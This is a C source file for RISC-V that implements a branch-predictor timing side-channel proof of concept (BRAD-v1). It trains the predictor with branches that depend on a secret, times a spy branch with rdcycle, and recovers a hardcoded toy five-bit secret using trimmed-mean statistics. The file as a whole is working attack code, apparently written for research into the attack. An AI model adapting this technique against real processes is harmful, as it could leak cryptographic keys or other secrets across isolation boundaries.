// brad_v1_trimmed.c
// BRAD-v1 with paired outlier removal and trimmed mean decision
// Compile: riscv64-linux-gnu-gcc -O2 -static -fno-pie -no-pie -fno-reorder-blocks -fno-branch-count-reg -fno-tree-vectorize -lm -o brad_v1_trimmed brad_v1_trimmed.c

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <math.h>

#define SECRET_LEN      5
#define ATTACK_ROUNDS   40     // number of train+probe rounds per index
#define TRAINING_REPS   32     // how many victim calls per round (drive predictor)
#define PROBE_SAMPLES   600    // how many spy_f calls per measured sum
#define OUTLIER_K       3.0    // threshold: mean + OUTLIER_K * stddev -> mark as outlier
#define MAX_ROUNDS      200    // must be >= ATTACK_ROUNDS

volatile uint8_t sec[SECRET_LEN] = {1,0,0,1,0};
volatile uint8_t array1[1] = {1};

/* rdcycle with fences */
static inline uint64_t rdcycle_serialized(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

/* single shared branch site to make predictor indexing consistent */
__attribute__((noinline))
void branch_site(volatile uint8_t *addr) {
    if (*addr) {
        asm volatile("nop; nop; nop; nop; nop; nop");
    } else {
        asm volatile("addi t1, zero, 2; nop; nop");
    }
}

__attribute__((noinline))
void victim_f(unsigned idx) {
    branch_site(&sec[idx]);
}

__attribute__((noinline))
void spy_f(void) {
    branch_site(&array1[0]);
}

/* measure spy for value v PROBE_SAMPLES times; return total cycles */
static uint64_t measure_spy_total(uint8_t v, unsigned samples) {
    uint64_t sum = 0;
    array1[0] = v;
    for (unsigned i = 0; i < samples; ++i) {
        uint64_t t0 = rdcycle_serialized();
        spy_f();
        uint64_t t1 = rdcycle_serialized();
        sum += (t1 - t0);
    }
    return sum;
}

/* compute mean and stddev for an array of uint64_t values of length n */
static void compute_mean_std(const uint64_t vals[], int n, double *out_mean, double *out_std) {
    if (n <= 0) { *out_mean = 0.0; *out_std = 0.0; return; }
    double sum = 0.0;
    for (int i = 0; i < n; ++i) sum += (double)vals[i];
    double mean = sum / n;
    double v = 0.0;
    for (int i = 0; i < n; ++i) {
        double d = (double)vals[i] - mean;
        v += d * d;
    }
    double std = (n > 1) ? sqrt(v / n) : 0.0;
    *out_mean = mean;
    *out_std = std;
}

/* Paired outlier removal:
   - Given per-round sums sums1[] and sums0[] of length n,
   - compute mean/std for each,
   - mark a round i as outlier if sums1[i] > mean1 + k*std1 OR sums0[i] > mean0 + k*std0
   - compute trimmed mean (mean of remaining rounds) for sums1 and sums0 and return them.
   - returns number of rounds kept (>=0). If none kept, returns 0 and the function returns raw means.
*/
static int paired_trimmed_means(const uint64_t sums1[], const uint64_t sums0[],
                                int n, double k, double *mean1_out, double *mean0_out) {
    if (n <= 0) { *mean1_out = 0.0; *mean0_out = 0.0; return 0; }

    double mean1, std1, mean0, std0;
    compute_mean_std(sums1, n, &mean1, &std1);
    compute_mean_std(sums0, n, &mean0, &std0);

    double thresh1 = mean1 + k * std1;
    double thresh0 = mean0 + k * std0;

    double sum1 = 0.0, sum0 = 0.0;
    int kept = 0;

    for (int i = 0; i < n; ++i) {
        if ((double)sums1[i] > thresh1 || (double)sums0[i] > thresh0) {
            /* drop this round (paired removal) */
            continue;
        }
        sum1 += (double)sums1[i];
        sum0 += (double)sums0[i];
        kept++;
    }

    if (kept == 0) {
        /* fallback: return raw means (no trimming possible) */
        *mean1_out = mean1;
        *mean0_out = mean0;
        return 0;
    }

    *mean1_out = sum1 / kept;
    *mean0_out = sum0 / kept;
    return kept;
}

int main(void) {
    printf("BRAD-v1 trimmed mean (paired outlier removal)\n");
    printf("Params: ATTACK_ROUNDS=%d TRAINING_REPS=%d PROBE_SAMPLES=%d OUTLIER_K=%.2f\n\n",
           ATTACK_ROUNDS, TRAINING_REPS, PROBE_SAMPLES, OUTLIER_K);

    printf("Secret (ground truth): ");
    for (unsigned i = 0; i < SECRET_LEN; ++i) printf("%u ", sec[i]);
    printf("\n\n");

    if (ATTACK_ROUNDS > MAX_ROUNDS) {
        fprintf(stderr, "ERROR: increase MAX_ROUNDS (current %d) to >= ATTACK_ROUNDS (%d)\n", MAX_ROUNDS, ATTACK_ROUNDS);
        return 1;
    }

    uint64_t sums1[MAX_ROUNDS];
    uint64_t sums0[MAX_ROUNDS];

    for (unsigned idx = 0; idx < SECRET_LEN; ++idx) {
        /* collect per-round sums */
        for (unsigned r = 0; r < ATTACK_ROUNDS; ++r) {
            /* train the predictor using the real secret */
            for (unsigned t = 0; t < TRAINING_REPS; ++t) victim_f(idx);

            /* measure spy(1) and spy(0) */
            sums1[r] = measure_spy_total(1, PROBE_SAMPLES);
            sums0[r] = measure_spy_total(0, PROBE_SAMPLES);

            /* optional: you can print per-round CSV lines for offline analysis
               printf("csv,%u,%u,%llu,%llu\n", idx, r, (unsigned long long)sums1[r], (unsigned long long)sums0[r]);
            */
        }

        /* compute raw means first (per-probe) for reporting */
        double raw_mean1 = 0.0, raw_mean0 = 0.0;
        for (unsigned r = 0; r < ATTACK_ROUNDS; ++r) { raw_mean1 += (double)sums1[r]; raw_mean0 += (double)sums0[r]; }
        raw_mean1 /= (double)ATTACK_ROUNDS;
        raw_mean0 /= (double)ATTACK_ROUNDS;

        /* paired trimmed means (operating on totals). Returns number of rounds kept */
        double kept_mean1_total = 0.0, kept_mean0_total = 0.0;
        int kept = paired_trimmed_means(sums1, sums0, ATTACK_ROUNDS, OUTLIER_K, &kept_mean1_total, &kept_mean0_total);

        double mean1_per_probe, mean0_per_probe;
        if (kept > 0) {
            mean1_per_probe = kept_mean1_total / (double)PROBE_SAMPLES;
            mean0_per_probe = kept_mean0_total / (double)PROBE_SAMPLES;
        } else {
            /* fallback to raw mean (no trimming succeeded) */
            mean1_per_probe = raw_mean1 / (double)PROBE_SAMPLES;
            mean0_per_probe = raw_mean0 / (double)PROBE_SAMPLES;
        }

        int recovered = (mean1_per_probe < mean0_per_probe) ? 1 : 0;

        printf("Index %u: raw_mean1=%.3f cycles raw_mean0=%.3f cycles ", idx, raw_mean1/(double)PROBE_SAMPLES, raw_mean0/(double)PROBE_SAMPLES);
        if (kept > 0)
            printf("trimmed_mean1=%.3f trimmed_mean0=%.3f (kept %d/%d rounds) => recovered=%d (actual=%u)\n",
                   mean1_per_probe, mean0_per_probe, kept, ATTACK_ROUNDS, recovered, sec[idx]);
        else
            printf("no rounds kept (falling back to raw) => recovered=%d (actual=%u)\n", recovered, sec[idx]);

        /* Optional: print per-round totals and mark removed rounds */
        for (unsigned r = 0; r < ATTACK_ROUNDS; ++r) {
            double m1 = (double)sums1[r];
            double m0 = (double)sums0[r];
            /* recompute thresholds to show which rounds would be removed (for debugging) */
            /* NOTE: compute_mean_std used full set earlier; we can reuse by recomputing, but keeping code simple here */
            printf("  round %2u: sum1=%10llu sum0=%10llu\n", r, (unsigned long long)sums1[r], (unsigned long long)sums0[r]);
        }
        printf("\n");
    }

    return 0;
}